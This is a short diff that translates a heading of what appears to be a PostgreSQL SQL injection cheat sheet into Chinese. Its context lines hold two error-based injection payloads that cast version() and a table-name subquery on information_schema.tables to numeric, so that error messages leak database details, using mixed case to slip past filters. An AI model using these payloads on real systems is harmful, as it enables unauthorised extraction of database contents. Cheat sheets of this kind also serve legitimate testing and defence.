@@ -1,6 +1,6 @@
 # POSTGRESQL
 
-##PostgreSQL Error Based - Basic
+## PostgreSQL 基于错误的 - 基础 
 ```
 ,cAsT(chr(126)||vErSiOn()||chr(126)+aS+nUmeRiC)
 ,cAsT(chr(126)||(sEleCt+table_name+fRoM+information_schema.tables+lImIt+1+offset+data_offset)||chr(126)+as+nUmeRiC)--
